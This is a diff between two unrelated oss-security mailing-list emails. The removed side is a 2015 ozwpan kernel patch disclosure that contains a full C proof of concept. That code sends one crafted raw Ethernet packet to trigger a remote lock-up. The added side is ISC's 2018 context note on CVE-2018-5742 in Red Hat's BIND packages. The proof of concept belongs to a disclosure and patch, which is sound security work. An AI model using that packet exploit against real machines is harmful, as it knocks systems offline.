@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["4550" "Wednesday" "13" "May" "2015" "20:33:34" "+0200" "Jason A. Donenfeld" "Jason@zx2c4.com" "<1431542014-3239-5-git-send-email-Jason@zx2c4.com>" "179" "[oss-security] [PATCH 4/4] ozwpan: unchecked signed subtraction leads to DoS" nil nil nil "5" "2015051318:33:34" "[oss-security] [PATCH 4/4] ozwpan: unchecked signed subtraction leads to DoS" (number mark "U       Jason@zx2c4. May 13  179/4550  " thread-indent "\"[oss-security] [PATCH 4/4] ozwpan: unchecked signed subtraction leads to DoS\"\n") "<1431542014-3239-1-git-send-email-Jason@zx2c4.com>" ("<1431542014-3239-1-git-send-email-Jason@zx2c4.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1898" "Wednesday" "19" "December" "2018" "11:14:18" "-0500" "ISC Security Officer" "security-officer@isc.org" "<def14c75-4133-0d9c-cef6-e2256a826bdd@isc.org>" "44" "[oss-security] Additional context information about RedHat's announcement of CVE-2018-5742" nil nil nil "12" "2018121916:14:18" "[oss-security] Additional context information about RedHat's announcement of CVE-2018-5742" (number mark "U       security-off Dec 19   44/1898  " thread-indent "\"[oss-security] Additional context information about RedHat's announcement of CVE-2018-5742\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 7231 invoked by uid 550); 13 May 2015 18:35:10 -0000
+Received: (qmail 30093 invoked by uid 550); 19 Dec 2018 16:19:04 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,204 +12,86 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 3854 invoked from network); 13 May 2015 18:34:43 -0000
-DKIM-Signature: v=1; a=rsa-sha1; c=relaxed; d=zx2c4.com; h=from:to:cc
-	:subject:date:message-id:in-reply-to:references; s=mail; bh=n9hQ
-	AYzYkvWQDNJQwGLkzcQsItw=; b=j15a+/JJJ9FuuFa3YNmYtblL5m/7W/4m+oGb
-	eWR7Lz3DFfYqQba0gGM6MEs89s/2Gnivttxqqy/cQhlATChL4UnvH2qiZMguOFml
-	2Oo+pWcXm5o1TuuK6PWud51UCCzecerdxHWfvdENYSuUafEgxKtlIiynEu1l2tKW
-	oX8TKkyA8RVyN1xx8gp3TlkYWV8x2kDp+6A7sulAseQKrynKj6hMB9t22dl3ZMCy
-	DGbpSeWvqnDANNAftuIvwjSywD1AjiNh9XUpUkWJFkNW+yY8qeDh3XLhJla5ble0
-	8YhIYCs6qjiW5WKJ2YXiUVc8PoAtzg19dn9CdPaEUJOVq56/QQ==
-From: "Jason A. Donenfeld" <Jason@zx2c4.com>
-To: shigekatsu.tateno@atmel.com,
-	linux-kernel@vger.kernel.org,
-	netdev@vger.kernel.org,
-	oss-security@lists.openwall.com
-Cc: "Jason A. Donenfeld" <Jason@zx2c4.com>
-Date: Wed, 13 May 2015 20:33:34 +0200
-Message-Id: <1431542014-3239-5-git-send-email-Jason@zx2c4.com>
-X-Mailer: git-send-email 2.3.6
-In-Reply-To: <1431542014-3239-1-git-send-email-Jason@zx2c4.com>
-References: <1431542014-3239-1-git-send-email-Jason@zx2c4.com>
-Subject: [oss-security] [PATCH 4/4] ozwpan: unchecked signed subtraction leads to DoS
+Received: (qmail 26506 invoked from network); 19 Dec 2018 16:14:33 -0000
+From: ISC Security Officer <security-officer@isc.org>
+Openpgp: preference=signencrypt
+Autocrypt: addr=security-officer@isc.org; prefer-encrypt=mutual; keydata=
+ mQENBEsnyOQBCAC+WKYHcaDGD9a2ztwdccmhnzo0YJ9SOPVIonqGxCa6o8TwfipyH9Wh5uFq
+ c6Ne+I0+vWohQtBIeodQHgGGlbjdxMp3QxohvqCmZcoObH7kjI1lpKQ6TMvRvo79pq5WRIuE
+ +Jbm6Rt9Hz3w9APrYzISzeCuHFK7vlZfaLdoI0SxzEuzMmyOvQpa6dgSKQF6G2Nsbz1RYujZ
+ 6fE6GXtc+I9q44yJS4llYpUqYpPh5CsfbDx8HwMWPj9eYOwjf3/vniFeG9tHIB8E+p7UBTG7
+ bTVRlEgmyC1Ry0OPO3UPKjL/Dja8IeeJamT0dlsRCD/O/WTyxQg9EceCgUvOz65puKkrABEB
+ AAG0L0lTQyBTZWN1cml0eSBPZmZpY2VyIDxzZWN1cml0eS1vZmZpY2VyQGlzYy5vcmc+iQEx
+ BBMBAgAbBQJLJ8jkAhsDBgsJCAcKAgQVCggCAh4BAheAAAoJEL2X3GOe6MR7gZYIAI4uSaX7
+ HwU2ywaCO77q5O/Zzzp6M+Oi+z7G00GFpACMSDSjX8kbZoIIW7FXb9US/9XLwqDtjlrGOLbd
+ zcZ/+EMsJM/HpT796YH8Y9gMpsH5SZq5gByeguT6KgjqF2w8yNX7/r0AM3psfVSv9l595CoJ
+ WNbDBHqGpqMi55SqKLCQOJ8noDp4x+JVNcJ1AdK/QVSk+gEhLqrvoYNyG8B/C2LL1fBQC8sF
+ kX/M1mKlkM83GnJlPWCrig69VlR+relppEuZ5G34z93c9NtCqdH6zLzzej2qmwLb/dYJYvhE
+ EMDlgvlSWw6yaJTuuEfuqHonrgOTXgb3Ln8A7XJECuSgWrK5AQ0ESyfI5AEIAKUsrY4AxF87
+ HvBEqhCXIt1o8plzVoIT5kY/p2n48U+oNGl5v4qNiC4SQZIvsA+Fcew8BhAYbNFTOsK/NKVO
+ yiLkLOqQnkuBlESzzvMcl0gSuX1t99V2SJpCKukCa+jkTcjJnURODJn5Wp9GLAWXutxJvJnT
+ t4oxcnAKun6Zt1vyOQs2lI9zXCTi8AdDKTiA/Es66CPVCRcMFUS6l9ArN57gUP0KRj8N0OfO
+ QPdzShnGrSdtM0D2Ei2pmUcgkvSIeNU5HRd2iMpWGO1L8yfGQvp7dzjWbG7i/2RTnZ+KR3a2
+ OMmtXUNuWQF3AfohS0TRTAcAR7IgOLzyy2prT9XKtCcAEQEAAYkBHwQYAQIACQUCSyfI5AIb
+ DAAKCRC9l9xjnujEeze1CAC4A+KZdRi08gBxG4hKuvpL0fHfwnVmrLR39c0mQR9tE+iUcOez
+ qER3z2fn/Zm5nMTZcauzCXMmFXwKWlGufiDrXVqKCyEHkYyBnn3U9ksRigo8eG/X3+G3US9k
+ 0c7FfWaIrOY2IdGWUQic0ENOu/94VAFaleI4BBQvnDIY6hr4Fm14qXgssF7YwcEreoUU+Ayh
+ Yc52tlDssU9DUaX/vn7OD42FIzpUzgUyoZ97UtPX+m9P5YN2Teeq0iVkcxxmT9wuNYCCZb1W
+ 03hvcA8uwvRkNDbdQ//dma2gXdUPoXfBJT4kLo1/KV5GimPHdn0h172E1RKLgKtrJ58TVTJ6 UV1r
+To: oss-security@lists.openwall.com
+Cc: "security-officer@isc.org" <security-officer@isc.org>
+Message-ID: <def14c75-4133-0d9c-cef6-e2256a826bdd@isc.org>
+Date: Wed, 19 Dec 2018 11:14:18 -0500
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:60.0)
+ Gecko/20100101 Thunderbird/60.3.3
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+Content-Language: en-US
+Content-Transfer-Encoding: quoted-printable
+Subject: [oss-security] Additional context information about RedHat's announcement of
+ CVE-2018-5742
 
-The subtraction here was using a signed integer and did not have any
-bounds checking at all. This commit adds proper bounds checking, made
-easy by use of an unsigned integer. This way, a single packet won't be
-able to remotely trigger a massive loop, locking up the system for a
-considerable amount of time. A PoC follows below, which requires
-ozprotocol.h from this module.
+Hello --
 
-=-=-=-=-=-=
+Internet Systems Consortium would like to provide packagers and
+redistributors of our software some additional context concerning
+CVE-2018-5742, which was announced yesterday by RedHat, affecting
+some BIND packages in RedHat and CentOS.
 
- #include <arpa/inet.h>
- #include <linux/if_packet.h>
- #include <net/if.h>
- #include <netinet/ether.h>
- #include <stdio.h>
- #include <string.h>
- #include <stdlib.h>
- #include <endian.h>
- #include <sys/ioctl.h>
- #include <sys/socket.h>
+Their disclosure of the issue can be found via this page:
 
- #define u8 uint8_t
- #define u16 uint16_t
- #define u32 uint32_t
- #define __packed __attribute__((__packed__))
- #include "ozprotocol.h"
+  https://access.redhat.com/security/cve/cve-2018-5742
 
-static int hex2num(char c)
-{
-	if (c >= '0' && c <= '9')
-		return c - '0';
-	if (c >= 'a' && c <= 'f')
-		return c - 'a' + 10;
-	if (c >= 'A' && c <= 'F')
-		return c - 'A' + 10;
-	return -1;
-}
-static int hwaddr_aton(const char *txt, uint8_t *addr)
-{
-	int i;
-	for (i = 0; i < 6; i++) {
-		int a, b;
-		a = hex2num(*txt++);
-		if (a < 0)
-			return -1;
-		b = hex2num(*txt++);
-		if (b < 0)
-			return -1;
-		*addr++ = (a << 4) | b;
-		if (i < 5 && *txt++ != ':')
-			return -1;
-	}
-	return 0;
-}
+and more information can be found in their respective bug trackers:
 
-int main(int argc, char *argv[])
-{
-	if (argc < 3) {
-		fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
-		return 1;
-	}
+  https://bugzilla.redhat.com/show_bug.cgi?id=3DCVE-2018-5742
+  https://bugs.centos.org/view.php?id=3D15528
 
-	uint8_t dest_mac[6];
-	if (hwaddr_aton(argv[2], dest_mac)) {
-		fprintf(stderr, "Invalid mac address.\n");
-		return 1;
-	}
+The RedHat announcement is understandably focused mostly on the
+impact to customers using their packages, but because some of the
+other subscribers to this list distribute their own packages that
+are based on BIND we thought it might be helpful to provide some
+additional information about this CVE.
 
-	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
-	if (sockfd < 0) {
-		perror("socket");
-		return 1;
-	}
+1)  The issue does not exist in any of the BIND source packages
+    provided directly by ISC.
 
-	struct ifreq if_idx;
-	int interface_index;
-	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
-	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
-		perror("SIOCGIFINDEX");
-		return 1;
-	}
-	interface_index = if_idx.ifr_ifindex;
-	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {
-		perror("SIOCGIFHWADDR");
-		return 1;
-	}
-	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;
+2)  We have worked with RedHat to determine the root cause of
+    CVE-2018-5742 and have concluded that it was introduced
+    accidentally while backporting the Negative Trust Anchor (NTA)
+    feature to a branch of BIND prior to when it was introduced
+    in the upstream (ISC) version.  We would therefore advise
+    any other packagers who have backported NTA to the BIND 9.9
+    or 9.10 codebase that they might want to investigate to see whether
+    they have similarly introduced a vulnerability in their code.
+    If you find that you have done so, please contact
+    security-officer@isc.org, as ISC are the CVE Numbering Authority
+    for BIND and we will need to be included in the discussion
+    as to whether any such vulnerabilities fall under CVE-2018-5742
+    or require a separate CVE ID assignment.
 
-	struct {
-		struct ether_header ether_header;
-		struct oz_hdr oz_hdr;
-		struct oz_elt oz_elt;
-		struct oz_elt_connect_req oz_elt_connect_req;
-		struct oz_elt oz_elt2;
-		struct oz_multiple_fixed oz_multiple_fixed;
-	} __packed packet = {
-		.ether_header = {
-			.ether_type = htons(OZ_ETHERTYPE),
-			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
-			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
-		},
-		.oz_hdr = {
-			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
-			.last_pkt_num = 0,
-			.pkt_num = htole32(0)
-		},
-		.oz_elt = {
-			.type = OZ_ELT_CONNECT_REQ,
-			.length = sizeof(struct oz_elt_connect_req)
-		},
-		.oz_elt_connect_req = {
-			.mode = 0,
-			.resv1 = {0},
-			.pd_info = 0,
-			.session_id = 0,
-			.presleep = 0,
-			.ms_isoc_latency = 0,
-			.host_vendor = 0,
-			.keep_alive = 0,
-			.apps = htole16((1 << OZ_APPID_USB) | 0x1),
-			.max_len_div16 = 0,
-			.ms_per_isoc = 0,
-			.up_audio_buf = 0,
-			.ms_per_elt = 0
-		},
-		.oz_elt2 = {
-			.type = OZ_ELT_APP_DATA,
-			.length = sizeof(struct oz_multiple_fixed) - 3
-		},
-		.oz_multiple_fixed = {
-			.app_id = OZ_APPID_USB,
-			.elt_seq_num = 0,
-			.type = OZ_USB_ENDPOINT_DATA,
-			.endpoint = 0,
-			.format = OZ_DATA_F_MULTIPLE_FIXED,
-			.unit_size = 1,
-			.data = {0}
-		}
-	};
+If you are distributing BIND packages and have further questions
+we will do our best to answer them.
 
-	struct sockaddr_ll socket_address = {
-		.sll_ifindex = interface_index,
-		.sll_halen = ETH_ALEN,
-		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
-	};
-
-	if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
-		perror("sendto");
-		return 1;
-	}
-	return 0;
-}
-
-Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
----
- drivers/staging/ozwpan/ozusbsvc1.c | 4 +++-
- 1 file changed, 3 insertions(+), 1 deletion(-)
-
-diff --git a/drivers/staging/ozwpan/ozusbsvc1.c b/drivers/staging/ozwpan/ozusbsvc1.c
-index 2e67956..934a571 100644
---- a/drivers/staging/ozwpan/ozusbsvc1.c
-+++ b/drivers/staging/ozwpan/ozusbsvc1.c
-@@ -326,11 +326,13 @@ static void oz_usb_handle_ep_data(struct oz_usb_ctx *usb_ctx,
- 			struct oz_multiple_fixed *body =
- 				(struct oz_multiple_fixed *)data_hdr;
- 			u8 *data = body->data;
--			int n;
-+			unsigned int n;
- 			if (!body->unit_size)
- 				break;
- 			n = (len - sizeof(struct oz_multiple_fixed)+1)
- 				/ body->unit_size;
-+			if (n > len / body->unit_size)
-+				break;
- 			while (n--) {
- 				oz_hcd_data_ind(usb_ctx->hport, body->endpoint,
- 					data, body->unit_size);
--- 
-2.3.6
-
+Michael McNally
+(as ISC Security Officer)
